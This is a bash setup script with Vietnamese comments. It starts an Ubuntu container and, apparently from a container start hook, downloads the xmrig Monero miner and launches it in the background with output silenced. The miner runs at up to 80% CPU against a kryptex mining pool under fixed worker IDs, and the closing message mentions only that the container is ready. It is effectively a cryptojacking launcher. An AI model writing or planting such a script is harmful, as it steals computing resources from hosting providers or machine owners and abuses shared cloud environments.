#!/bin/bash
set -e

echo "==> Khởi động Ubuntu container..."
docker compose up -d

echo "==> Chờ container sẵn sàng..."
sleep 3

echo "==> Kiểm tra và chạy xmrig trong Ubuntu..."
docker exec ubuntu_cli bash -c '
set -e

# Cài wget nếu chưa có
if ! command -v wget &> /dev/null; then
    echo "Cài đặt wget..."
    apt update && apt install -y wget
fi

cd ~
if [ -d "xmrig-6.26.0" ]; then
    echo "Đã có xmrig, chạy lại..."
    cd xmrig-6.26.0
    # Chạy background để không block postStart
    nohup ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.whoiss -p x --coin monero --cpu-max-threads-hint=80 > /dev/null 2>&1 &
else
    echo "Tải xmrig về..."
    wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
    tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz
    cd xmrig-6.26.0
    echo "Chạy xmrig lần đầu..."
    nohup ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.whhhhr4rt -p x --coin monero --cpu-max-threads-hint=80 > /dev/null 2>&1 &
fi
'

echo "==> Hoàn tất! Mở terminal mới để vào Ubuntu."
